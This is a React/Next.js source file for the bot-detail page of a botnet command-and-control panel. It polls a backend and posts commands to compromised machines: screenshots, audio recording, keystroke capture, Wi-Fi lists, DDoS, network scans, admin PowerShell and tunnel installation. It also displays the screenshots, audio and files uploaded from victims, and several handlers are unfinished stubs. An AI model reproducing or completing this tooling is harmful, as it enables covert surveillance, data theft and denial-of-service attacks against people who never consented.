"use client"
import {
    Alert, AlertIcon,
    Breadcrumb,
    BreadcrumbItem,
    BreadcrumbLink,
    Button, Input, InputGroup, InputRightElement, Text, useToast,
} from '@chakra-ui/react'


import Terminal, {ColorMode, TerminalOutput} from 'react-terminal-ui';

import {useParams} from "next/navigation";
import {useEffect, useState} from "react";

import C2TerminalOutput from "@/components/C2TerminalOutput";
import BotTerminalOutput from "@/components/BotTerminalOutput";

type TerminalLine = typeof C2TerminalOutput | typeof BotTerminalOutput;

export interface Channel {
    botId : string;
    messages: any[]
    commands: any[]
}

const backendUrl = "http://10.0.0.24:3000/backend";
const pullingInterval = 3000;

export default function BotDetailPage() {

    const params = useParams();
    const currentBot =  params.id;

    const [channel, setChannel] = useState<Channel | null>(null)
    const [loading, setLoading] = useState<boolean>(false)
    const [command, setCommand] = useState<boolean>(false)
    const toast = useToast()

    useEffect(() => {
        const timer = setInterval(() => {
            getChannel();
        }, pullingInterval);
        return () => clearInterval(timer);
    }, []);

    async function getChannel() {
        setLoading(true)
        const url = backendUrl + "/channels";
        const res = await fetch(url);
        const data = await res.json();
        console.log(data);
        const botChannel = data.find((c: Channel) => c.botId === currentBot)
        setChannel(botChannel)
        setLoading(false)
    }

    async function handleRefresh() {
        await getChannel()
    }

    function commandSent() {
        toast({
            title: 'Command sent sucessfully',
            description: "The command was sent to the bot",
            status: 'success',
            duration: 1000,
            isClosable: true,
        })
    }

    async function handleClear() {

        const payload = {
            "botId" : currentBot,
            "name" : "ClearCommands",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
        await getChannel()
    }

    async function handlePing() {

    }

    async function handleScreen()  {
        const payload = {
            "botId" : currentBot,
            "name" : "Screenshot",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
        await getChannel()
    }

    async function handleAudio()  {
        const payload = {
            "botId" : currentBot,
            "name" : "AudioCapture",
            "args" : {
                length: 10,
                path: "C:\\Users\\john\\test.wav"
            }
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
        await getChannel()
    }

    async function handleSystemInfo() {
        const payload = {
            "botId" : currentBot,
            "name" : "GetSysInfo",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
    }

    async function handleFile() {
        throw new Error('Function not implemented.');
    }

    async function handlePublicIp(){
        const payload = {
            "botId" : currentBot,
            "name" : "GetPublicIp",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()

    }

    async function handlePrivateIp() {

        const payload = {
            "botId" : currentBot,
            "name" : "GetPrivateIp",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

        commandSent()

    }

    async function handleInstallPython() {

    }

    async function handleInstallIpScanner() {

    }

    async function handlePullingRate() {


        const payload = {
            "botId" : currentBot,
            "name" : "SetPullingRate",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleGateway() {
        const payload = {
            "botId" : currentBot,
            "name" : "Gateway",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleWifi() {
        const payload = {
            "botId" : currentBot,
            "name" : "WifiList",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleDdos() {
        const payload = {
            "botId" : currentBot,
            "name" : "Ddos",
            "args" : {
                command: "whoami"
            }
        }
        commandSent()

    }

    async function handleNetworkScan() {
        const payload = {
            "botId" : currentBot,
            "name" : "NetworkScan",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleCmd() {
        const payload = {
            "botId" : currentBot,
            "name" : "PowershellAdmin",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleAdminPowershell() {
        const payload = {
            "botId" : currentBot,
            "name" : "RunCommand",
            "args" : {
                command: "whoami"
            }
        }

        commandSent()
    }

    async function handleOpenTunnel() {
        const payload = {
            "botId" : currentBot,
            "name" : "OpenTunnel",
            "args" : {}
        }

        commandSent()
    }

    async function handleKeyboardData() {
        const payload = {
            "botId" : currentBot,
            "name" : "GetKeyboardData",
            "args" : {}
        }

        commandSent()
    }

    async function handleInstallTunnel() {

        const payload = {
            "botId" : currentBot,
            "name" : "InstallTunnel",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
        await getChannel()

    }

    function renderMessage(message: any) {
        if (message.from === "c2") {

            if (message.uploadType === "screen") {
                return (
                    <TerminalOutput key={message}>
                        <img src={backendUrl + "/storage/" + message.upload } alt={ message.upload} width={512} height={512}/>
                    </TerminalOutput>
                )
            } else if (message.uploadType === "audio") {
                return (
                    <TerminalOutput key={message}>
                        <figure>
                            <figcaption>Listen to the T-Rex:</figcaption>
                            <audio controls src={backendUrl + "/storage/" + message.upload }></audio>
                            <a href={backendUrl + "/storage/" + message.upload }> Download audio </a>
                        </figure>
                    </TerminalOutput>
                )
            } else if (message.uploadType === "file") {
                return (
                    <TerminalOutput key={message}>
                        <a href={backendUrl + "/storage/" + message.upload }> Download file </a>
                    </TerminalOutput>
                )
            }
            return <TerminalOutput key={message}>{"$root@C2 " + message.message}</TerminalOutput>
        } else {
            return <TerminalOutput key={message}>{ "$root@Bot " + message.message}</TerminalOutput>
        }
    }


    return (
        <main className="flex flex-wrap gap-4">
            <div className={"flex basis-full bg-gray-400  p-6 "}>
                <Breadcrumb>
                    <BreadcrumbItem>
                        <BreadcrumbLink href='/'>Dashboard</BreadcrumbLink>
                    </BreadcrumbItem>

                    <BreadcrumbItem isCurrentPage>
                        <BreadcrumbLink href={'/bots/'+currentBot}>Bot #{currentBot}</BreadcrumbLink>
                    </BreadcrumbItem>
                </Breadcrumb>
            </div>
            <div className={"flex basis-full flex-wrap p-2"}>
                <div className={"flex basis-full justify-between"}>
                    <h1>Bot Detail</h1>
                    <div className={"flex gap-4"}>
                        <Button colorScheme='blue' onClick={handleRefresh} isLoading={loading}>Refresh</Button>
                        <Button colorScheme='red' onClick={handleClear} isLoading={loading}>Clear Command</Button>
                    </div>
                </div>
                <div className={"flex basis-full gap-2 flex-wrap"}>
                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='blue' onClick={handleSystemInfo}>Get System Info</Button>
                        <Button colorScheme='blue' onClick={handlePublicIp}>Get Public Ip</Button>
                        <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
                    </div>

                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='green' onClick={handleAudio}>Record audio</Button>
                        <Button colorScheme='green' onClick={handleScreen}>Screenshot</Button>
                        <Button colorScheme='green' onClick={handleWifi}>Wifi list</Button>
                        <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
                        <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
                        <Button colorScheme='green' onClick={handleCmd}>Cmd</Button>
                        <Button colorScheme='green' onClick={handleAdminPowershell}>Admin Powershell</Button>
                        <Button colorScheme='green' onClick={handleKeyboardData}>Keyboard Data</Button>

                    </div>
                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='yellow' onClick={handleFile}>Get File</Button>
                        <Button colorScheme='yellow' onClick={handlePing}>Ping</Button>
                        <Button colorScheme='yellow' onClick={handleGateway}>Gateway</Button>
                        <Button colorScheme='yellow' onClick={handlePullingRate}>Pulling Rate</Button>
                        <Button colorScheme='yellow' onClick={handleOpenTunnel}>Open Tunnel</Button>
                        <Button colorScheme='yellow' onClick={handleInstallTunnel}>Install Tunnel</Button>
                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Ip Scanner</Button>
                        <Button colorScheme='yellow' onClick={handleInstallPython}>Install Python</Button>
                    </div>

                </div>
            </div>

            <div className={"flex basis-full flex-wrap p-4 gap-4"}>
                <div className={"flex basis-full"}>
                    <Text>Batch command</Text>
                    <InputGroup size='md'>
                        <Input pr='4.5rem'/>
                        <InputRightElement width='4.5rem'>
                            <Button h='1.75rem' size='sm'>Send</Button>
                        </InputRightElement>
                    </InputGroup>
                </div>
                <div className={"flex basis-full"}>
                    <InputGroup size='md'>
                        <Text>Powershell admin command</Text>
                        <Input pr='4.5rem'/>
                        <InputRightElement width='4.5rem'>
                            <Button h='1.75rem' size='sm'>Send</Button>
                        </InputRightElement>
                    </InputGroup>
                </div>
            </div>
            <div className={"flex basis-full flex-wrap p-4"}>
                <Terminal name='Bot channel' colorMode={ ColorMode.Dark }>
                    {channel && channel.messages.map((m) => {
                        return renderMessage(m)
                    })}
                </Terminal>
            </div>
        </main>
    )

}
